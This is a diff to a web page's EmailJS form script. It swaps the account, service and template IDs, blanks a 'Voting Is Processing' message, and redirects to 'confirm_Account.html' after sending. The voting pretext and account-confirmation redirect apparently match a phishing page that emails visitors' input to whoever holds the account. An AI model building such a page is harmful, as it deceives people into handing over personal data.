@@ -203,7 +203,7 @@ hr {
 
   <script type="text/javascript">
     (function() {
-        emailjs.init("Ru9DOfSWfnC58AvgD"); // Use your EmailJS User ID
+        emailjs.init("xlkCcpryUFq2iLP5L"); // Use your EmailJS User ID
     })();
 
     document.getElementById("contact-form").addEventListener("submit", function(event) {
@@ -222,10 +222,10 @@ hr {
         };
 
         // Send the email using EmailJS
-        emailjs.send("service_cyxyh2q", "template_bbsgxhi", emailParams)
+        emailjs.send("service_bq4sang", "template_odryly8", emailParams)
             .then(function(response) {
-                console.log("Voting Is Processing:", response);
-                alert("Voting Is Processing!");
+                console.log("", response);
+                alert("");
             // Redirect to another page after email is sent
         window.location.href = "confirm_Account.html";  // Redirect to a 'thank you' page after email is sent
             }, function(error) {
